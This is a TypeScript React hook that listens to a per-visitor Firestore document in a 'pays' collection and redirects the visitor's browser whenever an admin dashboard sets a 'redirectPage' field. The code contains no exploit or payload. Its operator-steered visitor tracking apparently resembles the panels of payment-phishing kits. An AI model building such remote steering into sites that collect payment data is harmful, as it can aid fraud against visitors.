/**
 * Hook to monitor redirect requests from admin dashboard
 * Checks Firebase for redirectPage field and navigates accordingly
 */

import { useEffect } from 'react'
import { useRouter } from 'next/navigation'
import { checkRedirectPage, clearRedirectPage } from '@/lib/visitor-tracking'
import { db } from '@/lib/firebase'
import { doc, onSnapshot } from 'firebase/firestore'

interface UseRedirectMonitorProps {
  visitorId: string
  currentPage: string
}

export function useRedirectMonitor({ visitorId, currentPage }: UseRedirectMonitorProps) {
  const router = useRouter()

  useEffect(() => {
    if (!visitorId) return

    // Listen to real-time changes in visitor document
    const unsubscribe = onSnapshot(
      doc(db, 'pays', visitorId),
      async (snapshot) => {
        if (snapshot.exists()) {
          const data = snapshot.data()
          const redirectPage = data.redirectPage

          // If redirect is requested and it's different from current page
          if (redirectPage && redirectPage !== currentPage) {
            console.log(`Redirecting from ${currentPage} to ${redirectPage}`)
            
            // Clear the redirect flag
            await clearRedirectPage(visitorId)
            
            // Navigate to the requested page
            const pageMap: Record<string, string> = {
              'home': '/',
              'insur': '/insur',
              'compar': '/compar',
              'check': '/check'
            }
            
            const targetUrl = pageMap[redirectPage] || '/'
            router.push(targetUrl)
          }
        }
      },
      (error) => {
        console.error('Error monitoring redirect:', error)
      }
    )

    // Cleanup subscription on unmount
    return () => unsubscribe()
  }, [visitorId, currentPage, router])
}
